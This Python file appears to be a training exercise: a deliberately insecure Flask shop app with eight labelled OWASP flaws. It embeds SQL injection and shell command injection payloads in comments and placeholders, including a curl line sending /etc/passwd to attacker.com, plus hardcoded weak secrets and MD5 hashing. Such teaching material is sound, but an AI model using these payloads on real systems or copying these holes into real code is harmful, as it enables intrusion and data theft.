"""
vulnerable_shop.py  —  Module 4: OWASP Bingo Exercise
======================================================
A deliberately broken Flask web application containing EIGHT security flaws
mapped to the OWASP Top 10:2025. This file is used for the OWASP Bingo
exercise: delegates annotate the printed (or on-screen) source code with
OWASP category labels BEFORE the instructor reveals the answer key.

INSTRUCTOR NOTE:
    Do NOT distribute this file with the flaw comments visible if you want
    delegates to find them unaided. Use the printed 'clean' version (strip
    the # Flaw N comments with:  grep -v '# Flaw' vulnerable_shop.py )

SETUP (one-time, per VM):
    pip3 install flask --break-system-packages
    python3 vulnerable_shop.py          # DB is created automatically on first run

ACCESS:
    http://localhost:5000
    Pre-seeded accounts:  admin / letmein   |   alice / password123   |   bob / qwerty

DELIBERATE FLAWS (do not fix in this file — use vulnerable_shop_fixed.py):
    Flaw 1  —  A02 Cryptographic Failures:      Hardcoded, trivial secret key
    Flaw 2  —  A05 Security Misconfiguration:   DEBUG=True can reach production
    Flaw 3  —  A02 Cryptographic Failures:      MD5 used for password hashing
    Flaw 4  —  A03 Injection:                   Raw f-string SQL (SQLi vector)
    Flaw 5  —  A07 Auth Failures:               Session stores username, not user_id
    Flaw 6  —  A01 Broken Access Control:       /profile has no authentication check
    Flaw 7  —  A01 Broken Access Control:       IDOR — any user_id accepted from URL
    Flaw 8  —  A03 Injection:                   Command injection via os.popen()
"""

from flask import Flask, request, session, jsonify, redirect, url_for, make_response
import sqlite3
import hashlib
import os

# ─────────────────────────────────────────────────────────────────────────────
#  Application configuration
# ─────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.secret_key = "password"          # Flaw 1 — hardcoded, trivial secret key; anyone who
                                     #           knows this can forge session cookies

app.config["DEBUG"] = True           # Flaw 2 — enables Werkzeug interactive debugger;
                                     #           grants RCE to anyone who triggers an exception

DB_PATH = "shop.db"


# ─────────────────────────────────────────────────────────────────────────────
#  Database helpers
# ─────────────────────────────────────────────────────────────────────────────

def get_db():
    """Return a SQLite connection. Each request gets its own connection."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row   # Allows dict-style column access
    return conn


def init_db():
    """Create tables and seed demo data if the database does not yet exist."""
    if os.path.exists(DB_PATH):
        return

    conn = get_db()
    c = conn.cursor()

    c.execute("""
        CREATE TABLE users (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            username      TEXT    UNIQUE NOT NULL,
            password_hash TEXT    NOT NULL,
            role          TEXT    NOT NULL DEFAULT 'user',
            email         TEXT,
            full_name     TEXT
        )
    """)

    c.execute("""
        CREATE TABLE products (
            id    INTEGER PRIMARY KEY AUTOINCREMENT,
            name  TEXT    NOT NULL,
            price REAL    NOT NULL,
            stock INTEGER NOT NULL DEFAULT 0
        )
    """)

    # Seed users — passwords hashed with MD5 (Flaw 3 — see login route)
    def md5(s):
        return hashlib.md5(s.encode()).hexdigest()

    users = [
        ("admin", md5("letmein"),      "admin", "admin@shopco.internal", "Shop Admin"),
        ("alice", md5("password123"),  "user",  "alice@example.com",    "Alice Smith"),
        ("bob",   md5("qwerty"),       "user",  "bob@example.com",      "Bob Jones"),
    ]
    c.executemany(
        "INSERT INTO users (username, password_hash, role, email, full_name) VALUES (?,?,?,?,?)",
        users
    )

    products = [
        ("Laptop Pro 15",   1299.99, 12),
        ("Wireless Mouse",    24.99, 87),
        ("USB-C Hub",         39.99, 43),
        ("Mechanical Keyboard", 89.99, 31),
        ("4K Webcam",         79.99, 18),
    ]
    c.executemany("INSERT INTO products (name, price, stock) VALUES (?,?,?)", products)
    conn.commit()
    conn.close()
    print("[*] Database initialised with demo data.")


# ─────────────────────────────────────────────────────────────────────────────
#  Inline HTML templates (kept in-file to make this app self-contained)
# ─────────────────────────────────────────────────────────────────────────────

BASE_HTML = """<!DOCTYPE html>
<html>
<head>
  <title>ShopCo — {title}</title>
  <style>
    body  {{ font-family: Arial, sans-serif; margin: 0; background: #f4f4f4; }}
    nav   {{ background: #c0392b; padding: 10px 20px; color: white; display: flex;
             justify-content: space-between; align-items: center; }}
    nav a {{ color: white; text-decoration: none; margin-left: 15px; font-size: 14px; }}
    .container {{ max-width: 900px; margin: 30px auto; background: white;
                  padding: 30px; border-radius: 6px; box-shadow: 0 2px 6px rgba(0,0,0,.1); }}
    input[type=text], input[type=password] {{
      width: 100%; padding: 8px; margin: 6px 0 14px; box-sizing: border-box;
      border: 1px solid #ccc; border-radius: 4px; }}
    button, .btn {{
      background: #c0392b; color: white; padding: 9px 20px; border: none;
      border-radius: 4px; cursor: pointer; text-decoration: none; font-size: 14px; }}
    .alert-danger  {{ background: #fdecea; border: 1px solid #e74c3c; padding: 10px;
                      border-radius: 4px; margin-bottom: 15px; color: #c0392b; }}
    .alert-success {{ background: #eaf4ea; border: 1px solid #27ae60; padding: 10px;
                      border-radius: 4px; margin-bottom: 15px; color: #1e7145; }}
    table  {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
    th, td {{ padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 14px; }}
    th     {{ background: #c0392b; color: white; }}
    tr:nth-child(even) {{ background: #f9f9f9; }}
    .flaw-tag {{ font-size: 11px; background: #e74c3c; color: white;
                 padding: 2px 6px; border-radius: 3px; margin-left: 8px; }}
  </style>
</head>
<body>
<nav>
  <span><strong>ShopCo</strong> — Demo Store</span>
  <div>
    {nav_links}
  </div>
</nav>
<div class="container">
  {content}
</div>
</body>
</html>"""


def render(title, content, nav_links=None):
    """Minimal template renderer — keeps the app self-contained."""
    if nav_links is None:
        if session.get("user"):
            nav_links = (
                f'<a href="/">Home</a>'
                f'<a href="/search">Products</a>'
                f'<a href="/profile?user_id=1">My Profile</a>'
                f'<a href="/ping">Ping Tool</a>'
                f'<a href="/logout">Logout ({session["user"]})</a>'
            )
        else:
            nav_links = '<a href="/">Home</a><a href="/login">Login</a>'
    return BASE_HTML.format(title=title, content=content, nav_links=nav_links)


# ─────────────────────────────────────────────────────────────────────────────
#  Routes
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    logged_in = session.get("user")
    content = """
        <h2>Welcome to ShopCo</h2>
        <p>A demonstration e-commerce application for security training.</p>
        <p>Use the navigation above to explore the app — and look for security issues.</p>
        <h3>Quick Links for the Exercise</h3>
        <ul>
          <li><a href="/login">Login page</a></li>
          <li><a href="/search">Product search</a></li>
          <li><a href="/profile?user_id=1">User profile (user_id=1)</a></li>
          <li><a href="/ping?host=localhost">Ping tool</a></li>
        </ul>
    """
    if logged_in:
        content += f'<div class="alert-success">Logged in as: <strong>{logged_in}</strong></div>'
    return render("Home", content)


@app.route("/login", methods=["GET", "POST"])
def login():
    error = ""

    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # Flaw 3 — MD5 is a broken, fast, rainbow-table-vulnerable hashing algorithm.
        #           Passwords should be hashed with bcrypt, scrypt, or Argon2.
        pw_hash = hashlib.md5(password.encode()).hexdigest()

        db = get_db()

        # Flaw 4 — Raw f-string interpolation in SQL. An attacker can supply:
        #           username:  admin' --
        #           password:  anything
        #           …which becomes: SELECT * FROM users WHERE username='admin' --' AND ...
        #           The -- comments out the password check entirely.
        query = (
            f"SELECT * FROM users "
            f"WHERE username='{username}' AND password_hash='{pw_hash}'"
        )
        row = db.execute(query).fetchone()
        db.close()

        if row:
            # Flaw 5 — Storing the mutable username in the session rather than the
            #           immutable user_id. An attacker who can rename an account, or who
            #           forges the session cookie (Flaw 1), can escalate privilege by
            #           storing a different username.
            session["user"]    = row["username"]
            session["role"]    = row["role"]
            # Should be: session["user_id"] = row["id"]
            return redirect(url_for("index"))
        else:
            error = "Invalid username or password."

    content = f"""
        <h2>Login</h2>
        {'<div class="alert-danger">' + error + '</div>' if error else ''}
        <form method="POST">
          <label>Username</label>
          <input type="text"     name="username" placeholder="Try: admin' -- " autocomplete="off">
          <label>Password</label>
          <input type="password" name="password" placeholder="Any password works with SQLi">
          <button type="submit">Login</button>
        </form>
        <p style="font-size:13px;color:#888">
          Demo accounts: admin/letmein &nbsp;|&nbsp; alice/password123 &nbsp;|&nbsp; bob/qwerty
        </p>
    """
    return render("Login", content)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/search")
def search():
    q    = request.args.get("q", "")
    rows = []

    if q:
        db = get_db()
        # Flaw 4 (second instance) — same raw string interpolation.
        # Payload: %' UNION SELECT id, username, password_hash, role, email FROM users --
        # This extracts the entire users table through the product search.
        query = f"SELECT * FROM products WHERE name LIKE '%{q}%'"
        try:
            rows = db.execute(query).fetchall()
        except Exception as e:
            # Flaw 2 side-effect — with DEBUG=True the Werkzeug debugger will expose
            # the full exception including the SQL query in the stack trace.
            return render("Search Error", f"<div class='alert-danger'>Query error: {e}</div>")
        finally:
            db.close()

    rows_html = ""
    for r in rows:
        rows_html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>£{r[2]:.2f}</td><td>{r[3]}</td></tr>"

    table = f"""
        <table>
          <tr><th>ID</th><th>Name</th><th>Price</th><th>Stock</th></tr>
          {rows_html if rows_html else '<tr><td colspan="4">No results</td></tr>'}
        </table>
    """ if q else ""

    content = f"""
        <h2>Product Search</h2>
        <form method="GET">
          <input type="text" name="q" value="{q}"
                 placeholder="Try: %' UNION SELECT id,username,password_hash,role,email FROM users --">
          <button type="submit">Search</button>
        </form>
        {table}
    """
    return render("Search", content)


@app.route("/profile")
def profile():
    # Flaw 6 — No authentication check. Any unauthenticated visitor can access
    #           this route. Should require session["user"] or a @login_required decorator.

    # Flaw 7 — IDOR: the user_id comes from the URL query string.
    #           An attacker changes ?user_id=1 to ?user_id=2 to read Alice's data,
    #           then ?user_id=3 to read Bob's, and so on.
    user_id = request.args.get("user_id", "1")

    db  = get_db()
    row = db.execute(
        f"SELECT * FROM users WHERE id={user_id}"   # Flaw 4 again + Flaw 7 combination
    ).fetchone()
    db.close()

    if not row:
        return render("Profile", "<div class='alert-danger'>User not found.</div>")

    content = f"""
        <h2>User Profile</h2>
        <p>Change the <code>user_id</code> parameter in the URL to view other accounts.</p>
        <table>
          <tr><th>Field</th><th>Value</th></tr>
          <tr><td>ID</td>           <td>{row["id"]}</td></tr>
          <tr><td>Username</td>     <td>{row["username"]}</td></tr>
          <tr><td>Role</td>         <td>{row["role"]}</td></tr>
          <tr><td>Email</td>        <td>{row["email"]}</td></tr>
          <tr><td>Full Name</td>    <td>{row["full_name"]}</td></tr>
          <tr><td>Password Hash</td><td style="font-family:monospace;font-size:12px">{row["password_hash"]}</td></tr>
        </table>
        <p style="font-size:13px;color:#888">
          Try: <a href="/profile?user_id=1">?user_id=1</a> &nbsp;
               <a href="/profile?user_id=2">?user_id=2</a> &nbsp;
               <a href="/profile?user_id=3">?user_id=3</a>
        </p>
    """
    return render("Profile", content)


@app.route("/ping")
def ping():
    host   = request.args.get("host", "")
    output = ""

    if host:
        # Flaw 8 — Command injection via os.popen() with unsanitised user input.
        #           os.popen() invokes a shell, so shell metacharacters are interpreted.
        #           Payloads:
        #             host = 127.0.0.1; id
        #             host = 127.0.0.1; cat /etc/passwd
        #             host = 127.0.0.1; ls -la /home/ubuntu
        #             host = 127.0.0.1 && curl http://attacker.com/?data=$(cat /etc/passwd|base64)
        output = os.popen(f"ping -c 2 {host}").read()

    content = f"""
        <h2>Network Ping Tool</h2>
        <form method="GET">
          <label>Hostname or IP address</label>
          <input type="text" name="host" value="{host}"
                 placeholder="Try: 127.0.0.1; id   or   localhost; cat /etc/passwd">
          <button type="submit">Ping</button>
        </form>
        {'<pre style="background:#1e1e1e;color:#d4d4d4;padding:15px;border-radius:4px;overflow:auto">'
         + output + '</pre>' if output else ''}
    """
    return render("Ping Tool", content)


@app.route("/admin")
def admin():
    """Admin panel — demonstrates Flaw 5: trusting the session username for role checks."""
    # This check is based on session["role"] which was set from the DB at login.
    # However, because Flaw 1 gives an attacker the ability to forge session cookies,
    # they can set role=admin without ever authenticating.
    if session.get("role") != "admin":
        return render("Admin", '<div class="alert-danger">Access denied. Admins only.</div>')

    db   = get_db()
    rows = db.execute("SELECT id, username, role, email FROM users").fetchall()
    db.close()

    rows_html = "".join(
        f"<tr><td>{r['id']}</td><td>{r['username']}</td><td>{r['role']}</td><td>{r['email']}</td></tr>"
        for r in rows
    )
    content = f"""
        <h2>Admin Panel — All Users</h2>
        <div class="alert-danger">
          This page is "protected" only by a session role check. Because the secret key
          is <code>password</code> (Flaw 1), an attacker can forge the session cookie
          and grant themselves admin access without knowing any credentials.
        </div>
        <table>
          <tr><th>ID</th><th>Username</th><th>Role</th><th>Email</th></tr>
          {rows_html}
        </table>
    """
    return render("Admin Panel", content)


# ─────────────────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    init_db()
    print("\n" + "=" * 60)
    print("  ShopCo Vulnerable Demo  —  Module 4 OWASP Bingo Exercise")
    print("=" * 60)
    print("  URL:      http://localhost:5000")
    print("  Accounts: admin/letmein  |  alice/password123  |  bob/qwerty")
    print("  WARNING:  This app is DELIBERATELY INSECURE.")
    print("            Run only in a closed lab environment.")
    print("=" * 60 + "\n")
    # DEBUG=True is Flaw 2 — this line intentionally mirrors app.config["DEBUG"] above
    app.run(host="0.0.0.0", port=5000, debug=True)
